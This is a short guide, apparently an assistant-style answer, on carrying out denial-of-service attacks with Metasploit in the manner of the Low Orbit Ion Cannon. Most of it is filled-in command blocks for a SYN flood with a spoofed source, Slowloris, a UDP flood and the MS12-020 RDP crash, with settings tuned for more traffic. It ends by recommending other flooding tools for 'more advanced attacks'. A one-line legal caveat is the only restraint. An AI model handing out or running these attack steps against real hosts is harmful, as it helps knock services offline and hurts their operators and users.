The ***Low Orbit Ion Cannon (LOIC)*** is a well-known tool for 
performing Denial-of-Service (DoS) attacks by flooding 
a target with TCP, UDP, or HTTP requests. 
While LOIC is a standalone application, We can achieve 
similar effects using **Metasploit** modules.

### **Metasploit Modules for DoS Attacks**
Metasploit has several modules that can perform DoS attacks against a target IP. Below are some relevant modules:

#### **1. `auxiliary/dos/tcp/synflood` (SYN Flood Attack)**
This module floods a target with SYN packets, consuming resources and potentially causing a DoS condition.

```bash
use auxiliary/dos/tcp/synflood
set RHOST <target_IP>
set RPORT <target_port>  # e.g., 80 for HTTP
set SHOST <spoofed_IP>   # Optional: Spoof source IP
set THREADS 50           # Number of threads (higher = more traffic)
run
```

#### ***2. `auxiliary/dos/http/slowloris` (Slowloris Attack)***
This module performs a Slowloris-style attack, keeping many HTTP 
connections open to exhaust server resources.

```bash
use auxiliary/dos/http/slowloris
set RHOST <target_IP>
set RPORT 80
set NUMCONNS 500        # Number of concurrent connections
run
```

#### **3. `auxiliary/dos/udp/udpflood` (UDP Flood Attack)**
This module floods a target with UDP packets, overwhelming its network capacity.

```bash
use auxiliary/dos/udp/udpflood
set RHOST <target_IP>
set RPORT <target_port>  # e.g., 53 for DNS
set PKT_SIZE 1024        # Packet size in bytes
set THREADS 100          # Number of threads
run
```

#### **4. `auxiliary/dos/windows/rdp/ms12_020_maxchannelids` (RDP DoS)**
This exploits a vulnerability in Windows RDP to crash the service (CVE-2012-0152).

```bash
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set RHOST <target_IP>
run
```

### **Important Notes:**
- **Legal & Ethical Considerations**: Performing DoS attacks without authorization is **illegal** in most jurisdictions. Use only in controlled environments (e.g., penetration testing with permission).
- **Effectiveness**: Many modern networks have mitigations (e.g., rate limiting, SYN cookies, DDoS protection), so these attacks may not always work.
- **Alternatives**: For more advanced attacks, consider tools like **hping3**, **GoldenEye**, or **HOIC** (High Orbit Ion Cannon).
